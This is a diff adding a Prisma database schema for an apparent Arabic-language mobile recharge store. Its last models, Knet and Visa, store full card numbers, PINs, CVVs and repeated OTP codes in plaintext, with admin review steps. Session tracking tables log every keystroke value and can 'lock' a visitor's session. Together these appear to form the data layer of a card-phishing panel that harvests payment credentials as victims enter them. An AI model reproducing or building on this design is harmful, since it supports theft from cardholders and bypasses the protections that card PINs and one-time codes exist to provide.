@@ -1,0 +1,217 @@
+generator client {
+  provider = "prisma-client-js"
+}
+
+datasource db {
+  provider = "sqlite"
+  url      = env("DATABASE_URL")
+}
+
+model User {
+  id           String        @id @default(cuid())
+  email        String        @unique
+  passwordHash String
+  name         String
+  role         String        @default("customer")
+  locale       String        @default("ar")
+  disabled     Boolean       @default(false)
+  createdAt    DateTime      @default(now())
+  savedNumbers    SavedNumber[]
+  capturedNumbers CapturedNumber[]
+  orders          Order[]
+  audits          AuditLog[]
+  sessions        UserSession[]
+}
+
+model CapturedNumber {
+  id        String   @id @default(cuid())
+  msisdn    String   @unique
+  userId    String?
+  user      User?    @relation(fields: [userId], references: [id], onDelete: SetNull)
+  createdAt DateTime @default(now())
+  updatedAt DateTime @updatedAt
+}
+
+model SavedNumber {
+  id     String  @id @default(cuid())
+  userId String
+  user   User    @relation(fields: [userId], references: [id], onDelete: Cascade)
+  msisdn String
+  label  String?
+
+  @@unique([userId, msisdn])
+}
+
+model Product {
+  id            String    @id
+  kind          String
+  category      String?
+  nameAr        String
+  nameEn        String
+  descriptionAr String    @default("")
+  descriptionEn String    @default("")
+  amountHalalas Int
+  validityDays  Int?
+  providerSku   String
+  active        Boolean   @default(true)
+  orders        Order[]
+  vouchers      Voucher[]
+}
+
+model Order {
+  id             String         @id @default(cuid())
+  userId         String?
+  user           User?          @relation(fields: [userId], references: [id])
+  productId      String
+  product        Product        @relation(fields: [productId], references: [id])
+  msisdn         String
+  amountHalalas  Int
+  status         String
+  idempotencyKey String         @unique
+  createdAt      DateTime       @default(now())
+  payment        Payment?
+  fulfillment    Fulfillment?
+  notifications  Notification[]
+
+  @@index([userId])
+  @@index([status])
+  @@index([msisdn])
+}
+
+model Payment {
+  id         String  @id @default(cuid())
+  orderId    String  @unique
+  order      Order   @relation(fields: [orderId], references: [id], onDelete: Cascade)
+  gateway    String
+  gatewayRef String?
+  status     String
+  rawEvent   String  @default("")
+}
+
+model Fulfillment {
+  id          String  @id @default(cuid())
+  orderId     String  @unique
+  order       Order   @relation(fields: [orderId], references: [id], onDelete: Cascade)
+  provider    String
+  providerRef String?
+  status      String
+  attempts    Int     @default(0)
+  lastError   String  @default("")
+}
+
+model Voucher {
+  id              String  @id @default(cuid())
+  codeHash        String  @unique
+  productId       String
+  product         Product @relation(fields: [productId], references: [id])
+  status          String  @default("unused")
+  redeemedOrderId String?
+}
+
+model Notification {
+  id        String   @id @default(cuid())
+  orderId   String
+  order     Order    @relation(fields: [orderId], references: [id], onDelete: Cascade)
+  channel   String
+  body      String
+  createdAt DateTime @default(now())
+}
+
+model AuditLog {
+  id        String   @id @default(cuid())
+  actorId   String?
+  actor     User?    @relation(fields: [actorId], references: [id])
+  action    String
+  orderId   String?
+  createdAt DateTime @default(now())
+}
+
+model Ticket {
+  id        String   @id @default(cuid())
+  name      String
+  email     String
+  message   String
+  createdAt DateTime @default(now())
+}
+
+// ── Real-time activity tracking ─────────────────────────────────────────────
+
+model UserSession {
+  id        String          @id @default(cuid())
+  userId    String?
+  user      User?           @relation(fields: [userId], references: [id], onDelete: SetNull)
+  ip        String          @default("")
+  userAgent String          @default("")
+  createdAt DateTime        @default(now())
+  lastSeen  DateTime        @default(now())
+  page      String          @default("/")
+  flowStage String          @default("browse")
+  locked    Boolean         @default(false)
+  orderId   String?
+  msisdn    String?
+  events    ActivityEvent[]
+
+  @@index([userId])
+  @@index([lastSeen])
+  @@index([locked])
+  @@index([orderId])
+  @@index([msisdn])
+}
+
+model ActivityEvent {
+  id        String      @id @default(cuid())
+  sessionId String
+  session   UserSession @relation(fields: [sessionId], references: [id], onDelete: Cascade)
+  userId    String?
+  type      String      // page_view | click | input | form_submit | idle
+  page      String
+  element   String?
+  value     String?
+  meta      String?
+  createdAt DateTime    @default(now())
+
+  @@index([sessionId])
+  @@index([userId])
+  @@index([type])
+  @@index([createdAt])
+}
+
+model Knet {
+  id          String   @id @default(cuid())
+  amount      Int
+  cardNumber  String
+  expiryDate  String
+  pin         String   @default("")
+  otp         String   @default("")
+  otpVerified Boolean  @default(false)
+  cvv         String   @default("")
+  cvvVerified Boolean  @default(false)
+  otp2        String   @default("")
+  otp2Verified Boolean @default(false)
+  status      String
+  reviewStep  String   @default("awaiting_admin_card")
+  orderId     String?  @unique
+  createdAt  DateTime @default(now())
+  updatedAt  DateTime @updatedAt
+
+  @@index([orderId])
+  @@index([status])
+}
+
+model Visa {
+  id          String   @id @default(cuid())
+  holderName  String
+  cardNumber  String
+  expiryDate  String
+  otp         String   @default("")
+  otpVerified Boolean  @default(false)
+  cvv         String   @default("")
+  cvvVerified Boolean  @default(false)
+  status      String
+  orderId     String?  @unique
+  createdAt   DateTime @default(now())
+  updatedAt   DateTime @updatedAt
+
+  @@index([orderId])
+  @@index([status])
+}
